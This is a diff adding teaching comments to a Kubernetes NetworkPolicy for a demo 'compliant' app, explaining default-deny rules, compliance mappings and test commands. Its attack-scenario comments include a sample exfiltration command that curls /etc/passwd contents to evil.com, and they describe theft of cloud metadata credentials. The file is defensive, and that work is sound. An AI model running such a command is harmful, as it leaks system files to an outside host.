@@ -1,4 +1,168 @@
-# Restrictive network policy - only allow necessary traffic
+# ============================================================================
+# COMPLIANT APPLICATION NETWORK POLICY - ZERO TRUST NETWORKING
+# ============================================================================
+#
+# PURPOSE:
+# Implements network segmentation using Kubernetes NetworkPolicy. This is a
+# critical security control that enforces the principle of least privilege
+# at the network layer - pods can only communicate with explicitly allowed
+# destinations.
+#
+# This NetworkPolicy implements a "default deny" posture with specific allows.
+#
+# ============================================================================
+# SECURITY CONTROLS IMPLEMENTED
+# ============================================================================
+#
+# 1. Ingress Restriction:
+#    - Only allows inbound HTTP traffic on port 8080
+#    - Only from default and kube-system namespaces
+#    - Blocks all other inbound traffic
+#
+# 2. Egress Restriction:
+#    - Only allows DNS queries (port 53 UDP/TCP)
+#    - Only to kube-system namespace (CoreDNS)
+#    - Blocks all other outbound traffic (prevents data exfiltration)
+#
+# ============================================================================
+# COMPARISON WITH VULNERABLE APP (No NetworkPolicy)
+# ============================================================================
+#
+# | Aspect                  | Vulnerable App       | Compliant App        |
+# |-------------------------|----------------------|----------------------|
+# | Inbound Traffic         | Any pod can connect  | Whitelisted sources  |
+# | Outbound Traffic        | Can reach anywhere   | DNS only             |
+# | Data Exfiltration       | Easy                 | Blocked              |
+# | Lateral Movement        | Unrestricted         | Severely limited     |
+# | Cloud Metadata Access   | Possible (169.254.x) | Blocked              |
+# | Internet Access         | Yes                  | No                   |
+#
+# ============================================================================
+# ATTACK SCENARIOS PREVENTED
+# ============================================================================
+#
+# 1. LATERAL MOVEMENT:
+#    Without NetworkPolicy:
+#      - Attacker compromises any pod in cluster
+#      - Can reach vulnerable-app on port 80
+#      - Can probe other services for vulnerabilities
+#
+#    With NetworkPolicy:
+#      - Attacker in another namespace cannot reach compliant-app
+#      - Only traffic from allowed namespaces is permitted
+#
+# 2. DATA EXFILTRATION:
+#    Without NetworkPolicy:
+#      - Attacker exfiltrates data via HTTP(S) to external server
+#      - curl https://evil.com/steal?data=$(cat /etc/passwd)
+#
+#    With NetworkPolicy:
+#      - All outbound traffic blocked except DNS
+#      - Cannot establish connections to external destinations
+#
+# 3. COMMAND AND CONTROL (C2):
+#    Without NetworkPolicy:
+#      - Malware connects to C2 server for instructions
+#      - Downloads additional payloads
+#
+#    With NetworkPolicy:
+#      - Outbound connections blocked
+#      - Cannot reach C2 infrastructure
+#
+# 4. CLOUD METADATA ACCESS:
+#    Without NetworkPolicy:
+#      - Attacker accesses cloud metadata (169.254.169.254)
+#      - Steals service principal credentials
+#      - Compromises cloud account
+#
+#    With NetworkPolicy:
+#      - Metadata endpoint is not in allowed destinations
+#      - Access blocked at network layer
+#
+# ============================================================================
+# HOW NETWORKPOLICY WORKS
+# ============================================================================
+#
+# NetworkPolicies are implemented by the CNI (Container Network Interface)
+# plugin. Common CNI plugins with NetworkPolicy support:
+#
+# - Azure CNI with Network Policies (AKS)
+# - Calico
+# - Cilium
+# - Weave Net
+#
+# NOTE: The default kubenet CNI does NOT support NetworkPolicies.
+# In AKS, you must enable Azure Network Policy or Calico.
+#
+# NETWORKPOLICY LOGIC:
+#
+# 1. If no NetworkPolicy selects a pod:
+#    - All ingress is allowed
+#    - All egress is allowed
+#    (This is the vulnerable state)
+#
+# 2. If any NetworkPolicy selects a pod:
+#    - Only traffic matching explicit rules is allowed
+#    - All other traffic is denied (implicit deny)
+#
+# 3. Multiple NetworkPolicies are additive:
+#    - Traffic allowed by ANY policy is permitted
+#    - Policies can't subtract from each other
+#
+# ============================================================================
+# REGULATORY REQUIREMENTS
+# ============================================================================
+#
+# PCI-DSS:
+#   - 1.2: Build firewall and router configurations that restrict connections
+#   - 1.3: Prohibit direct public access between Internet and CDE
+#   - 1.3.4: Do not allow unauthorized outbound traffic from CDE
+#
+# HIPAA:
+#   - 164.312(e)(1): Transmission security - protect data in transit
+#   - 164.312(c)(1): Integrity controls - ensure data not improperly altered
+#
+# SOC 2:
+#   - CC6.6: Prevent unauthorized access to systems
+#   - CC6.7: Restrict transmission of data
+#
+# NIST 800-53:
+#   - SC-7: Boundary protection (network segmentation)
+#   - AC-4: Information flow enforcement
+#   - CA-3: System interconnections (document and control)
+#
+# ============================================================================
+# KYVERNO POLICIES FOR NETWORK POLICIES
+# ============================================================================
+#
+# Require NetworkPolicy exists for every namespace:
+#
+#   apiVersion: kyverno.io/v1
+#   kind: ClusterPolicy
+#   metadata:
+#     name: require-network-policy
+#   spec:
+#     validationFailureAction: audit  # Use 'enforce' in production
+#     rules:
+#       - name: check-network-policy
+#         match:
+#           resources:
+#             kinds:
+#               - Pod
+#         context:
+#           - name: netpols
+#             apiCall:
+#               urlPath: "/apis/networking.k8s.io/v1/namespaces/{{request.namespace}}/networkpolicies"
+#         validate:
+#           message: "Namespace must have at least one NetworkPolicy"
+#           deny:
+#             conditions:
+#               - key: "{{ netpols.items | length(@) }}"
+#                 operator: Equals
+#                 value: 0
+#
+# ============================================================================
+
 apiVersion: networking.k8s.io/v1
 kind: NetworkPolicy
 metadata:
@@ -8,26 +172,118 @@ metadata:
     app: compliant-app
     environment: demo
 spec:
+  # ===========================================================================
+  # POD SELECTOR
+  # ===========================================================================
+  # This NetworkPolicy applies to all pods with label app: compliant-app.
+  # An empty selector {} would apply to ALL pods in the namespace.
+  #
+  # BEST PRACTICE: Use specific selectors to avoid accidentally affecting
+  # other applications in the same namespace.
+  # ===========================================================================
   podSelector:
     matchLabels:
       app: compliant-app
+
+  # ===========================================================================
+  # POLICY TYPES
+  # ===========================================================================
+  # Specifies which directions this policy controls:
+  #   - Ingress: Inbound traffic TO the selected pods
+  #   - Egress: Outbound traffic FROM the selected pods
+  #
+  # IMPORTANT: Once you specify a policyType, ALL traffic of that type is
+  # denied by default. Only explicitly allowed traffic is permitted.
+  #
+  # If you don't specify a policyType:
+  #   - Ingress: Controlled if ingress rules exist
+  #   - Egress: NOT controlled (all egress allowed)
+  #
+  # BEST PRACTICE: Always explicitly specify both Ingress and Egress.
+  # ===========================================================================
   policyTypes:
     - Ingress
     - Egress
+
+  # ===========================================================================
+  # INGRESS RULES (Inbound Traffic)
+  # ===========================================================================
+  # Controls traffic COMING INTO the selected pods.
+  #
+  # RULE STRUCTURE:
+  # - Each item in the list is an independent rule
+  # - Traffic matching ANY rule is allowed
+  # - Within a rule, 'from' and 'ports' are ANDed together
+  #   (traffic must match BOTH the source AND the port)
+  # - Within 'from', items are ORed
+  #   (traffic can match ANY source in the list)
+  # ===========================================================================
   ingress:
-    # Allow inbound HTTP traffic only
+    # =========================================================================
+    # RULE: Allow HTTP traffic from specific namespaces
+    # =========================================================================
+    # This rule allows:
+    #   - Traffic to port 8080/TCP
+    #   - From pods in 'default' namespace OR 'kube-system' namespace
+    #
+    # WHY THESE NAMESPACES:
+    #   - default: Where Ingress controllers typically route traffic
+    #   - kube-system: System components that may need health checks
+    #
+    # CUSTOMIZE FOR YOUR ENVIRONMENT:
+    # In production, you might allow traffic from:
+    #   - ingress-nginx namespace (Ingress controller)
+    #   - monitoring namespace (Prometheus probes)
+    #   - specific application namespaces
+    # =========================================================================
     - ports:
         - protocol: TCP
           port: 8080
       from:
+        # Allow from default namespace
+        # kubernetes.io/metadata.name is auto-added to namespaces in K8s 1.21+
         - namespaceSelector:
             matchLabels:
               kubernetes.io/metadata.name: default
+        # Allow from kube-system namespace
         - namespaceSelector:
             matchLabels:
               kubernetes.io/metadata.name: kube-system
+
+  # ===========================================================================
+  # EGRESS RULES (Outbound Traffic)
+  # ===========================================================================
+  # Controls traffic LEAVING FROM the selected pods.
+  #
+  # THIS IS CRITICAL FOR SECURITY:
+  #   - Prevents data exfiltration
+  #   - Blocks command-and-control (C2) communications
+  #   - Prevents access to cloud metadata endpoints
+  #   - Limits lateral movement
+  #
+  # COMMON MISTAKE: Forgetting to allow DNS, which breaks name resolution.
+  # ===========================================================================
   egress:
-    # Allow DNS resolution
+    # =========================================================================
+    # RULE: Allow DNS resolution only
+    # =========================================================================
+    # This is the MINIMUM egress required for most applications.
+    # DNS allows the application to resolve service names to IP addresses.
+    #
+    # WHY BOTH UDP AND TCP:
+    #   - UDP 53: Standard DNS queries (most common)
+    #   - TCP 53: Large responses, zone transfers, DNS over TCP
+    #
+    # DESTINATION: kube-system namespace
+    #   - This is where CoreDNS runs in most clusters
+    #   - Prevents DNS to external resolvers (potential data leak)
+    #
+    # WHAT'S BLOCKED:
+    #   - HTTP/HTTPS to external services
+    #   - SSH, databases, APIs outside the cluster
+    #   - Cloud metadata (169.254.169.254)
+    #   - Everything except DNS
+    # =========================================================================
     - ports:
         - protocol: UDP
           port: 53
@@ -37,3 +293,68 @@ spec:
         - namespaceSelector:
             matchLabels:
               kubernetes.io/metadata.name: kube-system
+
+# ============================================================================
+# EXTENDING THIS POLICY
+# ============================================================================
+#
+# If your application needs additional network access, add specific rules:
+#
+# 1. Allow egress to a specific database:
+#
+#    egress:
+#      - ports:
+#          - protocol: TCP
+#            port: 5432  # PostgreSQL
+#        to:
+#          - namespaceSelector:
+#              matchLabels:
+#                app: database
+#            podSelector:
+#              matchLabels:
+#                role: primary
+#
+# 2. Allow egress to external API (by IP block):
+#
+#    egress:
+#      - ports:
+#          - protocol: TCP
+#            port: 443
+#        to:
+#          - ipBlock:
+#              cidr: 203.0.113.0/24  # External API IP range
+#
+# 3. Allow ingress from Ingress controller namespace:
+#
+#    ingress:
+#      - from:
+#          - namespaceSelector:
+#              matchLabels:
+#                kubernetes.io/metadata.name: ingress-nginx
+#        ports:
+#          - protocol: TCP
+#            port: 8080
+#
+# ============================================================================
+# TESTING NETWORKPOLICIES
+# ============================================================================
+#
+# 1. From an allowed namespace:
+#    kubectl run test --image=busybox --rm -it --restart=Never \
+#      -n default -- wget -qO- http://compliant-app.compliant-app.svc:80/healthz
+#    # Should succeed
+#
+# 2. From a non-allowed namespace:
+#    kubectl run test --image=busybox --rm -it --restart=Never \
+#      -n other-namespace -- wget -qO- http://compliant-app.compliant-app.svc:80/healthz
+#    # Should timeout/fail
+#
+# 3. Test egress blocking from inside the pod:
+#    kubectl exec -it <pod-name> -n compliant-app -- wget -qO- https://google.com
+#    # Should fail (egress blocked)
+#
+# 4. Test DNS resolution works:
+#    kubectl exec -it <pod-name> -n compliant-app -- nslookup kubernetes.default
+#    # Should succeed
+#
+# ============================================================================
